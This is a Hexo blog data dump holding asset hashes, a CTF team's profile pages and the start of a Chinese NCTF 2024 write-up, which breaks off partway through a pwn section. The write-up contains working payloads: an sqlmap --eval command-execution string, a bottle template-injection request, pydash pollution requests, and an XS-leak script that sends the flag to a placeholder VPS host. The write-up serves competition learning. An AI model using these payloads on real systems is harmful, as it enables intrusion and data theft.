png","hash":"158f8624e7363c88bbcbc1cc415633dce83a5c53","modified":1745241331429},{"_id":"public/images/9-1744626745338-13.png","hash":"4788d4082f0fa1092d811e83497dd02fcb9a851b","modified":1745241331429},{"_id":"public/images/9.png","hash":"4788d4082f0fa1092d811e83497dd02fcb9a851b","modified":1745241331429},{"_id":"public/images/9c43e75bc7c3aaa3044d82a99a932681.png","hash":"8172faac1702ec59880b66a7adcc37f3ecb97fc4","modified":1745241331429},{"_id":"public/images/QQ_1743832187198-1744626745339-71.png","hash":"18d84a782b3c757583ea379828a58a11c45abbb5","modified":1745241331429},{"_id":"public/images/QQ_1743832187198.png","hash":"18d84a782b3c757583ea379828a58a11c45abbb5","modified":1745241331429},{"_id":"public/images/QQ_1743832241003-1744626745339-73.png","hash":"e3b109c6498fda6d6c8270f2ddaca25d1c7e4b9f","modified":1745241331429},{"_id":"public/images/QQ_1743832241003.png","hash":"e3b109c6498fda6d6c8270f2ddaca25d1c7e4b9f","modified":1745241331429},{"_id":"public/images/QQ_1743832317067-1744626745339-74.png","hash":"6e33182f9cb963794949614af378779a6fe7faf1","modified":1745241331429},{"_id":"public/images/QQ_1743832317067.png","hash":"6e33182f9cb963794949614af378779a6fe7faf1","modified":1745241331429},{"_id":"public/images/QQ_1743832409731-1744626745339-76.png","hash":"e3d4965b17f1edbbbd0a68056e4c77f9fec1563e","modified":1745241331429},{"_id":"public/images/QQ_1743832409731.png","hash":"e3d4965b17f1edbbbd0a68056e4c77f9fec1563e","modified":1745241331429},{"_id":"public/images/QQ_1743832453654.png","hash":"b3cbee9e583caf924f778a6b5211e428e3af9c4f","modified":1745241331429},{"_id":"public/images/QQ_1743832453654-1744626745339-75.png","hash":"b3cbee9e583caf924f778a6b5211e428e3af9c4f","modified":1745241331429},{"_id":"public/images/QQ_1743832482740-1744626745339-77.png","hash":"ce9975ab513c40f1ec23aa9e98c35d711d725d03","modified":1745241331429},{"_id":"public/images/cry1-1744626745339-67.png","hash":"bed9953883f2559ea759d34a7003857e41475899","modified":1745241331429},{"_id":"public/images/QQ_1743836625906.png","hash":"2c126a8901dd75450adbf9e545eca1f599e9f867","modified":1745241331429},{"_id":"public/images/cry1.png","hash":"bed9953883f2559ea759d34a7003857e41475899","modified":1745241331429},{"_id":"public/images/QQ_1743832482740.png","hash":"ce9975ab513c40f1ec23aa9e98c35d711d725d03","modified":1745241331429},{"_id":"public/images/download-1744626745339-68.jpg","hash":"1b55dddcb95824ce8358cc680d600fe56d86e4e1","modified":1745241331429},{"_id":"public/images/download.jpg","hash":"1b55dddcb95824ce8358cc680d600fe56d86e4e1","modified":1745241331429},{"_id":"public/images/e859cd5cae823fc6e9ecd736647c7dab-1744626745337-9.png","hash":"f4f61fff58dcf34e12d6c20b779571f9e74c7dee","modified":1745241331429},{"_id":"public/images/e859cd5cae823fc6e9ecd736647c7dab.png","hash":"f4f61fff58dcf34e12d6c20b779571f9e74c7dee","modified":1745241331429},{"_id":"public/images/image-1744626745337-3.png","hash":"da599a1605d631bb4c9f96398e0ef82d8995fdab","modified":1745241331429},{"_id":"public/images/image-20250406194123399-1744626745337-4.png","hash":"8366d872ef6a5536f8cb5b7beb61dddebdd549ae","modified":1745241331429},{"_id":"public/images/image-20250406194123399.png","hash":"8366d872ef6a5536f8cb5b7beb61dddebdd549ae","modified":1745241331429},{"_id":"public/images/image-20250406200423921-1744626745337-5.png","hash":"716693d0252229c5d6f4255ac2ae344f904cf23f","modified":1745241331429},{"_id":"public/images/image-20250406200423921.png","hash":"716693d0252229c5d6f4255ac2ae344f904cf23f","modified":1745241331429},{"_id":"public/images/image.png","hash":"da599a1605d631bb4c9f96398e0ef82d8995fdab","modified":1745241331429},{"_id":"public/css/README.html","hash":"3c68b48595e975dd7614b64f71ffa1113d784228","modified":1745241331429},{"_id":"public/js/chunk-72ZP56JR.js","hash":"4618a0cf40d36ab1c97f8ac98231924a88f8d6f5","modified":1745241331429},{"_id":"public/css/hexo-theme-yun.css","hash":"3d7e599e3ffd0d52f9c9684ee017e7959eaecd72","modified":1745241331429},{"_id":"public/js/chunk-FEIY7W7S.js","hash":"bdf31df5623cdbe4d6629c1d602cad7a15e5cf78","modified":1745241331429},{"_id":"public/js/gallery-decrypt.js","hash":"e49d0d197ea23c3614899587164bea0fad52745e","modified":1745241331429},{"_id":"public/js/hexo-theme-yun.js","hash":"45ee98382ef218b24d8156bab7fad44421aca638","modified":1745241331429},{"_id":"public/js/pjax.js","hash":"eef6ca01fa183a8c48315931f26b99f51d0a148b","modified":1745241331429},{"_id":"public/js/say.js","hash":"03b1fe9cba03d6817fbe6c47a8d78925ba28fa75","modified":1745241331429},{"_id":"public/js/utils.js","hash":"fbd0119a09d6a60d967921b163a4e1dc3e32b5aa","modified":1745241331429},{"_id":"public/js/sidebar.js","hash":"f175377750f4213fc37ccf0fbeeeb21550e0f805","modified":1745241331429},{"_id":"public/js/comments/disqus.js","hash":"f53352ecb1a7a1b0c738ab16a095658810e563e5","modified":1745241331429},{"_id":"public/js/analytics/leancloud-visitors.js","hash":"71bef1d46be5c6df6c00b29ea2faab00da6224c5","modified":1745241331429},{"_id":"public/js/comments/waline.js","hash":"82958804027c29812ae2df7d01029082adafb95e","modified":1745241331429},{"_id":"public/js/search/local-search.js","hash":"b3d73b7357a791fff676d918178a4554ad7d4912","modified":1745241331429},{"_id":"public/js/ui/fireworks.js","hash":"e4e9bfe099c01c32e622144c381470307de49a09","modified":1745241331429},{"_id":"public/js/ui/banner.js","hash":"543b262da6e813cca107a26fd56078a87cd8441f","modified":1745241331429},{"_id":"public/js/search/algolia-search.js","hash":"871c2e2b9bdbd36329e928e9213a425d4ff420d6","modified":1745241331429},{"_id":"public/images/1744633170179-43.png","hash":"26ae7fa87ffdfacf1dfb02aab6ad1b7493cc8eca","modified":1745241331429},{"_id":"public/images/1744633170179-59.png","hash":"f59fe9de622f0870d911445655d72f456e2e8228","modified":1745241331429},{"_id":"public/images/1745240699575-16.png","hash":"91061bccfce1dc20f6ea1ccec6c3a8ae51356296","modified":1745241331429},{"_id":"public/images/1745240699575-18.png","hash":"994ae7e0d0fc451c31aa40d9ab9afcf26bbffcb7","modified":1745241331429},{"_id":"public/images/1745240699575-8.png","hash":"1900adf737706e11523f79bb5da896112b7879a0","modified":1745241331429},{"_id":"public/images/18-1744626745338-23.png","hash":"36d98d09958d48df2c0de6bbef66f0b03591de63","modified":1745241331429},{"_id":"public/images/19-1744626745338-25.png","hash":"49d4caae3f2b264a4f2b75871b1b7d267fe05aa8","modified":1745241331429},{"_id":"public/images/18.png","hash":"36d98d09958d48df2c0de6bbef66f0b03591de63","modified":1745241331429},{"_id":"public/images/19.png","hash":"49d4caae3f2b264a4f2b75871b1b7d267fe05aa8","modified":1745241331429},{"_id":"public/images/20.png","hash":"b2d5dea4497e81f28d9f6bb279caeb42fc29ec62","modified":1745241331429},{"_id":"public/images/20-1744626745338-26.png","hash":"b2d5dea4497e81f28d9f6bb279caeb42fc29ec62","modified":1745241331429},{"_id":"public/images/21-1744626745338-27.png","hash":"58a498b59a314ca8af2d8508d1e137de6fce5ad6","modified":1745241331429},{"_id":"public/images/21.png","hash":"58a498b59a314ca8af2d8508d1e137de6fce5ad6","modified":1745241331429},{"_id":"public/images/23-1744626745338-29.png","hash":"b3415f9b3cf72dc1b53f22f9b13d6fa9adfbfce0","modified":1745241331429},{"_id":"public/images/23.png","hash":"b3415f9b3cf72dc1b53f22f9b13d6fa9adfbfce0","modified":1745241331429},{"_id":"public/images/26-1744626745338-32.png","hash":"d25643ae7edb49b42e4519a822ed65a2523fd190","modified":1745241331429},{"_id":"public/images/26.png","hash":"d25643ae7edb49b42e4519a822ed65a2523fd190","modified":1745241331429},{"_id":"public/images/32-1744626745338-37.png","hash":"5cf446c1955667471c6edeaab1b84f97e341a692","modified":1745241331429},{"_id":"public/images/32.png","hash":"5cf446c1955667471c6edeaab1b84f97e341a692","modified":1745241331429},{"_id":"public/images/35-1744626745338-40.png","hash":"7d1e0cd5b597d57d8120a515b5a4b5c7852c717f","modified":1745241331429},{"_id":"public/images/37.png","hash":"516d701fedf19db3a1041cf9fcea6c18bce3e2f1","modified":1745241331429},{"_id":"public/images/35.png","hash":"7d1e0cd5b597d57d8120a515b5a4b5c7852c717f","modified":1745241331429},{"_id":"public/images/37-1744626745338-42.png","hash":"516d701fedf19db3a1041cf9fcea6c18bce3e2f1","modified":1745241331429},{"_id":"public/images/4-1744626745337-8.png","hash":"8cb039133430541427ba3193dc75cfc4f85ee439","modified":1745241331429},{"_id":"public/images/40-1744626745338-45.png","hash":"561674cb84b61dc759f7c55ba262bf3243d4572a","modified":1745241331429},{"_id":"public/images/40.png","hash":"561674cb84b61dc759f7c55ba262bf3243d4572a","modified":1745241331429},{"_id":"public/images/4.png","hash":"8cb039133430541427ba3193dc75cfc4f85ee439","modified":1745241331429},{"_id":"public/images/41.png","hash":"b576f6d0e5edf3640651b8c448fe315f1a468226","modified":1745241331429},{"_id":"public/images/42-1744626745338-48.png","hash":"07837a9dd6a1098f75f29f0c57f7bb8e8b66920f","modified":1745241331429},{"_id":"public/images/42.png","hash":"07837a9dd6a1098f75f29f0c57f7bb8e8b66920f","modified":1745241331429},{"_id":"public/images/41-1744626745338-46.png","hash":"b576f6d0e5edf3640651b8c448fe315f1a468226","modified":1745241331429},{"_id":"public/images/45-1744626745338-50.png","hash":"acaf3cd834060aacfafd9c17287133976772ba36","modified":1745241331429},{"_id":"public/images/45.png","hash":"acaf3cd834060aacfafd9c17287133976772ba36","modified":1745241331429},{"_id":"public/images/5-1744626745337-10.png","hash":"821904b346d06ad3da61541e6651037a384b895e","modified":1745241331429},{"_id":"public/images/5.png","hash":"821904b346d06ad3da61541e6651037a384b895e","modified":1745241331429},{"_id":"public/images/1742737001478-793cdfb8-490c-40bc-939e-41e4ccc41789.png","hash":"7c681471613029f1478a61012f211c62d792ec33","modified":1745241331429},{"_id":"public/images/1742734417878-d64fe88d-06aa-4999-9e95-396404fccb0d.png","hash":"823c691b85ad97c492f18500de88f20ee61f267f","modified":1745241331429},{"_id":"public/images/1743832192177-4db0fe2b-d520-4cb8-a301-b8e5017a93f6.png","hash":"89dd601da03bebd3421496fd52fb65cf1ce88ecd","modified":1745241331429},{"_id":"public/images/1744633170177-5.png","hash":"5d55ce4a5151291028f06e552e4cbf77c4ef7b22","modified":1745241331429},{"_id":"public/images/1744633170178-27.png","hash":"6c028c2f219462caa92a26c9d4b0c9379340697f","modified":1745241331429},{"_id":"public/images/51.png","hash":"18af087c14303ad47475d70a1ccaad4be087b7de","modified":1745241331429},{"_id":"public/images/51-1744626745338-56.png","hash":"18af087c14303ad47475d70a1ccaad4be087b7de","modified":1745241331429},{"_id":"public/images/52-1744626745338-57.png","hash":"b588d8a304292d9ffc8a6639c78e08b821352a9e","modified":1745241331429},{"_id":"public/images/52.png","hash":"b588d8a304292d9ffc8a6639c78e08b821352a9e","modified":1745241331429},{"_id":"public/images/53-1744626745339-58.png","hash":"3790288c3846e37986cc23cd65c79ae30a8efe73","modified":1745241331429},{"_id":"public/images/53.png","hash":"3790288c3846e37986cc23cd65c79ae30a8efe73","modified":1745241331429},{"_id":"public/images/6-1744626745337-11.png","hash":"7ab9b831324e895a61fd0d458ecd49801be7c684","modified":1745241331429},{"_id":"public/images/6.png","hash":"7ab9b831324e895a61fd0d458ecd49801be7c684","modified":1745241331429},{"_id":"public/images/60-1744626745339-65.png","hash":"3e7a3edbde16f5c63c533c3b2415373e3d81e2c9","modified":1745241331429},{"_id":"public/images/60.png","hash":"3e7a3edbde16f5c63c533c3b2415373e3d81e2c9","modified":1745241331429},{"_id":"public/images/1744633170179-44.png","hash":"294389609e529acd632f75f64d1a79af375d5fba","modified":1745241331429},{"_id":"public/images/1745240699575-12.png","hash":"950815d669eab35e284fc333dbd335cb08f0ef30","modified":1745241331429},{"_id":"public/images/1745240699575-14.png","hash":"3a88aa406117c267d86ad499b8841295566c3faf","modified":1745241331429},{"_id":"public/images/1745240699575-19.png","hash":"6bd0bf41a50e87887f1b46a0008fa55f7e288362","modified":1745241331429},{"_id":"public/images/1745240699575-23.png","hash":"080d6fc3ae358c2d7bb4237a399a7bb219c3d620","modified":1745241331429},{"_id":"public/images/1745240699575-24.png","hash":"558481d879ee76a72c150a3ecead2078e4e48eff","modified":1745241331429},{"_id":"public/images/1745240699576-30.png","hash":"a2c9c6b045d2e4bd348da3aee6b667f9c7547934","modified":1745241331429},{"_id":"public/images/24.png","hash":"c54fe4e9e5f3e28dd79cb7afb0bb995268175943","modified":1745241331429},{"_id":"public/images/24-1744626745338-30.png","hash":"c54fe4e9e5f3e28dd79cb7afb0bb995268175943","modified":1745241331429},{"_id":"public/images/34.png","hash":"0e7602b8ce7c6156d3f27f53cf0615db1b727803","modified":1745241331429},{"_id":"public/images/34-1744626745338-39.png","hash":"0e7602b8ce7c6156d3f27f53cf0615db1b727803","modified":1745241331429},{"_id":"public/images/48-1744626745338-53.png","hash":"e8d0907679e848415dc97538d736c0b46f45c15b","modified":1745241331429},{"_id":"public/images/48.png","hash":"e8d0907679e848415dc97538d736c0b46f45c15b","modified":1745241331429},{"_id":"public/images/1744633170178-33.png","hash":"14152fa0732dd24cebc9489c9880a0dc3cf1aee2","modified":1745241331429},{"_id":"public/images/EASY_1_decpy3-1744626745339-69.png","hash":"0bac6370d425f09c429f0f069f7aee4a3279355e","modified":1745241331429},{"_id":"public/images/EASY_1_decpy3.png","hash":"0bac6370d425f09c429f0f069f7aee4a3279355e","modified":1745241331429},{"_id":"public/images/1744633170179-46.png","hash":"15866b6188036e73a05600203e4a0815d6f07164","modified":1745241331429},{"_id":"public/images/1743836639502-b7bffbac-436b-46f2-befe-b8721af93a21-1744626745339-72.png","hash":"ce26fa6282ca1c6e1a4d9a7228683d2a305c46c8","modified":1745241331429},{"_id":"public/images/1743836639502-b7bffbac-436b-46f2-befe-b8721af93a21.png","hash":"ce26fa6282ca1c6e1a4d9a7228683d2a305c46c8","modified":1745241331429},{"_id":"public/images/1744633170179-47.png","hash":"b586515bc9f1a06b093b6f73abb433e3d4ae47f7","modified":1745241331429},{"_id":"public/images/1743832246607-a4d1e387-7c34-4b1f-8976-0072acc846e0.png","hash":"be268605f96ff7349b75e41a157840f8230e5013","modified":1745241331429},{"_id":"public/images/1744633170179-42.png","hash":"073cd07bdc8b7154993a83365c081181b6011ddf","modified":1745241331429},{"_id":"public/images/1744633170179-45.png","hash":"a7e23229757263812a6e74f7e5bf6f593251c01a","modified":1745241331429},{"_id":"public/images/1745240699576-31.png","hash":"cbbab7cb7d57ebb2d09ee5e3915a59da77cd2fa2","modified":1745241331429},{"_id":"public/images/1745240699575-21.png","hash":"5bef497924242b4b49f5ab780ff799c1f968384a","modified":1745241331429},{"_id":"public/images/1745240699575-15.jpeg","hash":"4ca697c96ab81c3f39e385a07b0452ac9f4322c3","modified":1745241331429},{"_id":"public/images/1743832460587-59d98e57-5146-4856-896d-04cdbf25ec1d.png","hash":"b78bf2bb7a50e5be60428c9aed0ac9543b1e5979","modified":1745241331429},{"_id":"public/images/1745240699575-17.png","hash":"9e2c0630cc4c271395239e87a1231947f00be739","modified":1745241331429},{"_id":"public/images/1745240699576-32.png","hash":"1c6ede0835c90c4974f061a03109f9d493110610","modified":1745241331429},{"_id":"public/images/1743830570517-f27a27f5-6602-4d75-a083-44d91f7fa2ec.png","hash":"3620feb4da894bab740868b4ff561d1e1e953c41","modified":1745241331429},{"_id":"public/images/1743830469095-d3da92b6-fe65-4091-9f86-70cfa0d36846.jpeg","hash":"a4cab27024c075bbd381bb21290fc0adf3182e0d","modified":1745241331429},{"_id":"public/images/1745240699575-13.png","hash":"07a064cbc167c1cbd502efe30eb5fc7adc0ca485","modified":1745241331429}],"Category":[{"name":"wp","_id":"cm9r3mmes0008f0lsbuto69b5"}],"Data":[],"Page":[{"layout":"404","title":"游荡到了未知时空","reward":false,"_content":"\n# \n\n# O.o\n\n# - | -\n\n# / \\\n\n","source":"404.md","raw":"---\nlayout: 404\ntitle: 游荡到了未知时空\npermalink: /404.html\nreward: false\n---\n\n# \n\n# O.o\n\n# - | -\n\n# / \\\n\n","date":"2025-04-07T10:04:28.295Z","updated":"2025-04-07T10:04:28.295Z","path":"/404.html","comments":1,"_id":"cm9r3mmel0000f0lsgpod546z","content":"<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h1 id=\"O-o\"><a href=\"#O-o\" class=\"headerlink\" title=\"O.o\"></a>O.o</h1><h1 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"- | -\"></a>- | -</h1><h1 id=\"-2\"><a href=\"#-2\" class=\"headerlink\" title=\"&#x2F; \\\"></a>&#x2F; \\</h1>","excerpt":"","more":"<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h1 id=\"O-o\"><a href=\"#O-o\" class=\"headerlink\" title=\"O.o\"></a>O.o</h1><h1 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"- | -\"></a>- | -</h1><h1 id=\"-2\"><a href=\"#-2\" class=\"headerlink\" title=\"&#x2F; \\\"></a>&#x2F; \\</h1>"},{"date":"2017-10-12T02:47:16.000Z","comments":0,"type":"categories","_content":"","source":"categories/index.md","raw":"---\ndate: 2017-10-12 10:47:16\ncomments: false\ntype: categories\n---\n","updated":"2025-04-14T10:38:51.526Z","path":"categories/index.html","title":"","layout":"page","_id":"cm9r3mmen0001f0lsg3hn3f4p","content":"","excerpt":"","more":""},{"title":"小队简介","date":"2025-04-07T10:16:12.000Z","_content":"\n## 不知道小队\n\n不知道小队是最初由四个VN小登临时凑成打NCTF的一个队。 “叫啥？” “不知道。” “那就叫不知道吧！”\n\n---\n\n## 队员\n\n**Web**：\n\n> LamentXU VN战队  高二\n\n**Pwn**：\n\n> JerrythePro123 VN战队 高二\n\n**Crypto**：\n\n> lianjin VN战队 大二\n\n**Reverse**：\n\n> Liv VN战队 大一\n\n> 5m10v3 山海关战队 大二\n\n## 比赛经历\n\nNCTF 2024 第六名\n\nXYCTF 2025 第一名\n\nTGCTF 2025 第三名\n\n## 队员Blog\n\nLamentXU：https://www.cnblogs.com/LAMENTXU\n\nJerrythePro123：https://jerrythepro123.github.io/\n\nlianjin：https://lianjinlll.cn/\n\nLiv：https://tkazer.github.io/\n\n5m10v3：https://5m10v3.top/\n\n","source":"about/index.md","raw":"---\ntitle: 小队简介\ndate: 2025-04-07 18:16:12\n---\n\n## 不知道小队\n\n不知道小队是最初由四个VN小登临时凑成打NCTF的一个队。 “叫啥？” “不知道。” “那就叫不知道吧！”\n\n---\n\n## 队员\n\n**Web**：\n\n> LamentXU VN战队  高二\n\n**Pwn**：\n\n> JerrythePro123 VN战队 高二\n\n**Crypto**：\n\n> lianjin VN战队 大二\n\n**Reverse**：\n\n> Liv VN战队 大一\n\n> 5m10v3 山海关战队 大二\n\n## 比赛经历\n\nNCTF 2024 第六名\n\nXYCTF 2025 第一名\n\nTGCTF 2025 第三名\n\n## 队员Blog\n\nLamentXU：https://www.cnblogs.com/LAMENTXU\n\nJerrythePro123：https://jerrythepro123.github.io/\n\nlianjin：https://lianjinlll.cn/\n\nLiv：https://tkazer.github.io/\n\n5m10v3：https://5m10v3.top/\n\n","updated":"2025-04-14T10:00:59.541Z","path":"about/index.html","comments":1,"layout":"page","_id":"cm9r3mmen0002f0ls87lthpm2","content":"<h2 id=\"不知道小队\"><a href=\"#不知道小队\" class=\"headerlink\" title=\"不知道小队\"></a>不知道小队</h2><p>不知道小队是最初由四个VN小登临时凑成打NCTF的一个队。 “叫啥？” “不知道。” “那就叫不知道吧！”</p>\n<hr>\n<h2 id=\"队员\"><a href=\"#队员\" class=\"headerlink\" title=\"队员\"></a>队员</h2><p><strong>Web</strong>：</p>\n<blockquote>\n<p>LamentXU VN战队  高二</p>\n</blockquote>\n<p><strong>Pwn</strong>：</p>\n<blockquote>\n<p>JerrythePro123 VN战队 高二</p>\n</blockquote>\n<p><strong>Crypto</strong>：</p>\n<blockquote>\n<p>lianjin VN战队 大二</p>\n</blockquote>\n<p><strong>Reverse</strong>：</p>\n<blockquote>\n<p>Liv VN战队 大一</p>\n</blockquote>\n<blockquote>\n<p>5m10v3 山海关战队 大二</p>\n</blockquote>\n<h2 id=\"比赛经历\"><a href=\"#比赛经历\" class=\"headerlink\" title=\"比赛经历\"></a>比赛经历</h2><p>NCTF 2024 第六名</p>\n<p>XYCTF 2025 第一名</p>\n<p>TGCTF 2025 第三名</p>\n<h2 id=\"队员Blog\"><a href=\"#队员Blog\" class=\"headerlink\" title=\"队员Blog\"></a>队员Blog</h2><p>LamentXU：<a href=\"https://www.cnblogs.com/LAMENTXU\">https://www.cnblogs.com/LAMENTXU</a></p>\n<p>JerrythePro123：<a href=\"https://jerrythepro123.github.io/\">https://jerrythepro123.github.io/</a></p>\n<p>lianjin：<a href=\"https://lianjinlll.cn/\">https://lianjinlll.cn/</a></p>\n<p>Liv：<a href=\"https://tkazer.github.io/\">https://tkazer.github.io/</a></p>\n<p>5m10v3：<a href=\"https://5m10v3.top/\">https://5m10v3.top/</a></p>\n","excerpt":"","more":"<h2 id=\"不知道小队\"><a href=\"#不知道小队\" class=\"headerlink\" title=\"不知道小队\"></a>不知道小队</h2><p>不知道小队是最初由四个VN小登临时凑成打NCTF的一个队。 “叫啥？” “不知道。” “那就叫不知道吧！”</p>\n<hr>\n<h2 id=\"队员\"><a href=\"#队员\" class=\"headerlink\" title=\"队员\"></a>队员</h2><p><strong>Web</strong>：</p>\n<blockquote>\n<p>LamentXU VN战队  高二</p>\n</blockquote>\n<p><strong>Pwn</strong>：</p>\n<blockquote>\n<p>JerrythePro123 VN战队 高二</p>\n</blockquote>\n<p><strong>Crypto</strong>：</p>\n<blockquote>\n<p>lianjin VN战队 大二</p>\n</blockquote>\n<p><strong>Reverse</strong>：</p>\n<blockquote>\n<p>Liv VN战队 大一</p>\n</blockquote>\n<blockquote>\n<p>5m10v3 山海关战队 大二</p>\n</blockquote>\n<h2 id=\"比赛经历\"><a href=\"#比赛经历\" class=\"headerlink\" title=\"比赛经历\"></a>比赛经历</h2><p>NCTF 2024 第六名</p>\n<p>XYCTF 2025 第一名</p>\n<p>TGCTF 2025 第三名</p>\n<h2 id=\"队员Blog\"><a href=\"#队员Blog\" class=\"headerlink\" title=\"队员Blog\"></a>队员Blog</h2><p>LamentXU：<a href=\"https://www.cnblogs.com/LAMENTXU\">https://www.cnblogs.com/LAMENTXU</a></p>\n<p>JerrythePro123：<a href=\"https://jerrythepro123.github.io/\">https://jerrythepro123.github.io/</a></p>\n<p>lianjin：<a href=\"https://lianjinlll.cn/\">https://lianjinlll.cn/</a></p>\n<p>Liv：<a href=\"https://tkazer.github.io/\">https://tkazer.github.io/</a></p>\n<p>5m10v3：<a href=\"https://5m10v3.top/\">https://5m10v3.top/</a></p>\n"},{"title":"记录","date":"2025-04-07T10:16:12.000Z","_content":"\n\n\n## 比赛记录\n\n### 2025\n\n- nctf 第六名\n\n- XYCTF 第一名\n\n- TGCTF 第三名\n\n  \n\n  > 敬请期待 . . .\n\n\n\n## 网站历史\n\n### 2025.4.7\n\n- 博客正式搭建\n\n- 基础美化工作完成\n\n","source":"about/site.md","raw":"---\ntitle: 记录\ndate: 2025-04-07 18:16:12\n---\n\n\n\n## 比赛记录\n\n### 2025\n\n- nctf 第六名\n\n- XYCTF 第一名\n\n- TGCTF 第三名\n\n  \n\n  > 敬请期待 . . .\n\n\n\n## 网站历史\n\n### 2025.4.7\n\n- 博客正式搭建\n\n- 基础美化工作完成\n\n","updated":"2025-04-14T10:00:19.139Z","path":"about/site.html","comments":1,"layout":"page","_id":"cm9r3mmen0003f0ls4v8s117o","content":"<h2 id=\"比赛记录\"><a href=\"#比赛记录\" class=\"headerlink\" title=\"比赛记录\"></a>比赛记录</h2><h3 id=\"2025\"><a href=\"#2025\" class=\"headerlink\" title=\"2025\"></a>2025</h3><ul>\n<li><p>nctf 第六名</p>\n</li>\n<li><p>XYCTF 第一名</p>\n</li>\n<li><p>TGCTF 第三名</p>\n<blockquote>\n<p>敬请期待 . . .</p>\n</blockquote>\n</li>\n</ul>\n<h2 id=\"网站历史\"><a href=\"#网站历史\" class=\"headerlink\" title=\"网站历史\"></a>网站历史</h2><h3 id=\"2025-4-7\"><a href=\"#2025-4-7\" class=\"headerlink\" title=\"2025.4.7\"></a>2025.4.7</h3><ul>\n<li><p>博客正式搭建</p>\n</li>\n<li><p>基础美化工作完成</p>\n</li>\n</ul>\n","excerpt":"","more":"<h2 id=\"比赛记录\"><a href=\"#比赛记录\" class=\"headerlink\" title=\"比赛记录\"></a>比赛记录</h2><h3 id=\"2025\"><a href=\"#2025\" class=\"headerlink\" title=\"2025\"></a>2025</h3><ul>\n<li><p>nctf 第六名</p>\n</li>\n<li><p>XYCTF 第一名</p>\n</li>\n<li><p>TGCTF 第三名</p>\n<blockquote>\n<p>敬请期待 . . .</p>\n</blockquote>\n</li>\n</ul>\n<h2 id=\"网站历史\"><a href=\"#网站历史\" class=\"headerlink\" title=\"网站历史\"></a>网站历史</h2><h3 id=\"2025-4-7\"><a href=\"#2025-4-7\" class=\"headerlink\" title=\"2025.4.7\"></a>2025.4.7</h3><ul>\n<li><p>博客正式搭建</p>\n</li>\n<li><p>基础美化工作完成</p>\n</li>\n</ul>\n"},{"date":"2017-10-09T11:11:58.000Z","comments":0,"type":"tags","_content":"","source":"tags/index.md","raw":"---\ndate: 2017-10-09 19:11:58\ncomments: false\ntype: tags\n---\n","updated":"2025-04-14T10:39:07.478Z","path":"tags/index.html","title":"","layout":"page","_id":"cm9r3mmeo0004f0ls50o0heku","content":"","excerpt":"","more":""},{"layout":"links","title":"小队成员们","date":"2025-04-07T10:41:06.000Z","keywords":"链接","description":"云游的小伙伴们","comments":1,"placeholder":"还没想好说些什么","tip":"友链加载中～如失败请刷新重试～","_content":"","source":"links/index.md","raw":"---\nlayout: links\ntitle: 小队成员们\ndate: 2025-04-7 18:41:06\nkeywords: 链接\ndescription: 云游的小伙伴们\ncomments: true\n\n\nplaceholder: 还没想好说些什么 # 默认对友链的描述\ntip: 友链加载中～如失败请刷新重试～\n---\n","updated":"2025-04-07T10:42:57.540Z","path":"links/index.html","_id":"cm9r3mmer0006f0ls9bfdb0ld","content":"","excerpt":"","more":""}],"Post":[{"title":"NCTF24 不知道 WP","date":"2025-04-14T10:13:44.000Z","typora-root-url":"./..","_content":"\n# 战队名：不知道\n\n**排名：6**\n\n成员：LamentXU、Jerrythepro123、lianjin、Liv\n\n## ![](/images/1742736030430-b261e9ef-7633-418b-a3ba-ea5ac98f12ca.png)\n\n## WEB\n\n拉门特许超级无敌详细版：\n\n> https://www.cnblogs.com/LAMENTXU/articles/18799383\n\n### sqlmap-master\n\n签到题。\n\nsqlmap有个--exec可以执行。直接执行会有编码问题（我也不知道为什么）。但是可以用fromhex绕\n\npayload：\n\n> 127.0.0.1?id=1 --eval=exec(bytes.fromhex('5F5F696D706F72745F5F28276F7327292E73797374656D2827656E762729'))\n\n### ez_dash\n\n我是第一个报告非预期的（大声）\n\n根本不需要污染。bottle里<%也可以执行，waf没禁完。\n\n直接打abort回显。秒了。\n\n> GET /render?path=<%%20from%20bottle%20import%20abort%0afrom%20subprocess%20import%20getoutput%0aa=getoutput(\"env\")%0aabort(404,a)%20%>\n\n### ez_dash_revenge\n\n首先污染掉pydash的helpers.RESTRICTED_KEYS，不然拿不到__globals__\n\n> POST /setValue?name=pydash HTTP/1.1\n>\n> {\n>\n> \"path\": \"helpers.RESTRICTED_KEYS\",\n>\n> \"value\": \"123\"\n>\n> }\n\n然后setval找globals找bottle。改templete的路径，加一个/proc/self\n\n> POST /setValue?name=setval HTTP/1.1\n>\n> {\n>\n> \"path\": \"__globals__.bottle.TEMPLATE_PATH\",\n>\n> \"value\": [\"./\",\"./views/\",\n>\n> \t\"/proc/self/\"\n>\n> ]\n>\n> }\n\n随后直接render?path=environ即可\n\n### internal_api\n\nXS_leak，通过请求码来泄露。\n\nexp：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Error-Based Attack</title>\n</head>\n\n<body>\n    <script>\n        let currentFlag = \"nctf{\";\n        const chars = \"abcdef0123456789-{}\";\n\n        function sleep(ms) {\n            return new Promise(resolve => setTimeout(resolve, ms));\n        }\n\n        function checkCharacter(char) {\n            return new Promise((resolve) => {\n                let script = document.createElement('script');\n                script.src = `http://0.0.0.0:8000/internal/search?s=${currentFlag}${char}`;\n\n                script.onload = () => {\n                    document.head.removeChild(script);\n                    resolve(true);\n                };\n\n                script.onerror = () => {\n                    document.head.removeChild(script);\n                    resolve(false);\n                };\n\n                document.head.appendChild(script);\n            });\n        }\n\n        async function bruteforce() {\n            try {\n                while (!currentFlag.endsWith('}')) {\n                    for (let char of chars) {\n                        const isCorrect = await checkCharacter(char);\n                        if (isCorrect) {\n                            currentFlag += char;\n                            window.open(`http://VPS:8000/?flag=${currentFlag}`);\n                            await sleep(50);\n                            break;\n                        }\n                        await sleep(50);\n                    }\n                }\n            } catch (error) {\n                window.open(`http://VPS:8000/?error=${currentFlag}`);\n            }\n        }\n\n        bruteforce();\n    </script>\n</body>\n\n</html>\n```\n\nVPS起这个服务，bot访问即可\n\n![](/images/1742736741383-899b4fa3-fb61-4084-8d13-d712ca7d9aa2.png)\n\n## PWN\n\n### unauth-diary\n\n先创造largebin来泄漏libc和堆地址，之后创造一个大小为-1的堆块，这样可以溢出来打tcache poisioning。用stdout结构体打house of 